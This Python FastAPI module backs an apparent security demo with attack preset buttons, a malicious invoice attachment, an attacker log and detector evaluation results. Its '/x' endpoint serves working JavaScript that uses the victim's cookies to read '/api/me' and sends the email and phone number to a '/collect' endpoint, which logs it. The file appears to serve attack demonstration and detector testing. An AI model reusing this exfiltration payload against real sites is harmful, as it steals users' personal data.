"""화면용 데모 API (spec 8.5): 공격 버튼 목록, 공격 첨부 준비, 공격자 서버 기록."""

import json
import os
import threading
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from fastapi import APIRouter, HTTPException, Request, Response, status
from pydantic import BaseModel

from attacker.server import LOG_FILE, read_log
from attachments import save_attachment
from auth import CurrentUser, DbSession
from scenarios.attacks import extra_presets, presets


def _all_presets() -> list[dict[str, Any]]:
    # pinned=True는 고정 공격 버튼(S1·S2), False는 추천 묶음에 섞는 추가 공격
    return [{**p, "pinned": True} for p in presets()] + [{**p, "pinned": False} for p in extra_presets()]

DOCS_DIR = Path(__file__).resolve().parent / "scenarios" / "docs"

router = APIRouter(prefix="/api/demo", tags=["demo"])


class PresetInfo(BaseModel):
    id: str
    label: str
    message: str
    has_attachment: bool
    pinned: bool  # True=고정 공격 버튼, False=추천 묶음에 섞는 추가 공격


class AttachRequest(BaseModel):
    preset_id: str


@router.get("/presets")
def list_presets() -> list[PresetInfo]:
    return [
        PresetInfo(
            id=p["id"], label=p["label"], message=p["message"], has_attachment=bool(p["attachment"]), pinned=p["pinned"]
        )
        for p in _all_presets()
    ]


class AttachResult(BaseModel):
    attachment_id: int
    filename: str


@router.post("/attachment")
def preset_attachment(body: AttachRequest, user: CurrentUser, db: DbSession) -> AttachResult:
    """공격 프리셋의 청구서 PDF를 현재 사용자 첨부로 저장하고 id·파일명을 돌려준다 (S2 버튼용)."""
    preset = next((p for p in _all_presets() if p["id"] == body.preset_id), None)
    if preset is None or not preset["attachment"]:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "첨부가 있는 프리셋이 아닙니다")
    data = (DOCS_DIR / preset["attachment"]).read_bytes()
    attachment = save_attachment(db, user.id, preset["attachment"], data)
    return AttachResult(attachment_id=attachment.id, filename=attachment.filename)


@router.get("/attacker-log")
def attacker_log(_user: CurrentUser) -> list[dict[str, Any]]:
    """수집 지점이 받은 요청 기록. 로그인한 사용자만 읽는다.

    로컬은 독립 공격자 서버(127.0.0.1:9999), 배포는 아래 /x·/collect 엔드포인트가 같은 파일에 남긴다.
    """
    return read_log()


# ---- S2 유출 수집 (배포용): 독립 공격자 서버 대신 백엔드가 /x·/collect를 제공한다 ----
# 로컬 데모는 여전히 독립 9999 서버를 쓸 수 있고, 배포는 KFG_ATTACKER_BASE=//api.도메인/api/demo 로
# 이 두 엔드포인트를 가리킨다. 로그인이 필요 없다(피해자 브라우저가 호출하는 자리라서).
_log_lock = threading.Lock()


def _append_log(entry: dict[str, Any]) -> None:
    with _log_lock:
        LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
        with LOG_FILE.open("a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")


def _api_origin(request: Request) -> str:
    # 배포는 리버스 프록시 뒤라 request.base_url이 내부 주소일 수 있어 KFG_API_ORIGIN을 우선 쓴다.
    return (os.environ.get("KFG_API_ORIGIN", "").strip().rstrip("/")) or str(request.base_url).rstrip("/")


@router.get("/x")
def exfil_script(request: Request) -> Response:
    """S2 숨은 코드가 import로 불러가는 유출 스크립트.

    OFF 화면(app.도메인)에서 실행된다. httpOnly 쿠키는 못 읽지만, credentials:'include'로
    백엔드 /api/me를 (쿠키와 함께) 교차출처 호출해 연락처를 읽고 /collect로 보낸다.
    """
    api = _api_origin(request)
    script = (
        f"fetch('{api}/api/me',{{credentials:'include'}}).then(r=>r.json()).then(d=>{{"
        f"new Image().src='{api}/api/demo/collect?d='+encodeURIComponent(JSON.stringify({{email:d.email,phone:d.phone}}));"
        "});\n"
    )
    # 교차출처 모듈 import와 수집 요청을 허용. CSP(connect/img/script-src)가 우리 백엔드만 허용하므로
    # 외부로는 못 나간다.
    return Response(
        script,
        media_type="text/javascript; charset=utf-8",
        headers={"Access-Control-Allow-Origin": "*"},
    )


@router.get("/collect")
def collect(request: Request, d: str | None = None) -> Response:
    """빼돌린 값이 도착하는 곳. 받은 요청을 공격자 기록 파일에 한 줄 남긴다(성공 판정 근거)."""
    _append_log(
        {
            "time": datetime.now(timezone.utc).isoformat(),
            "method": "GET",
            "path": "/api/demo/collect",
            "query": {"d": d} if d is not None else {},
            "origin": request.headers.get("origin"),
            "referer": request.headers.get("referer"),
            "user_agent": request.headers.get("user-agent"),
        }
    )
    return Response(status_code=204, headers={"Access-Control-Allow-Origin": "*"})


ARTIFACTS = Path(__file__).resolve().parents[1] / "artifacts"


def _read_json(name: str) -> dict[str, Any] | None:
    path = ARTIFACTS / name
    if not path.exists():
        return None
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return None


@router.get("/eval")
def eval_latest(_user: CurrentUser) -> dict[str, Any]:
    """최근 탐지기(E-02)·공격 성공률(E-03) 평가 결과. 명령어로 돌린 결과 파일을 읽기만 한다 (U-06)."""
    return {"detector": _read_json("detector_eval.json"), "attack": _read_json("attack_eval.json")}
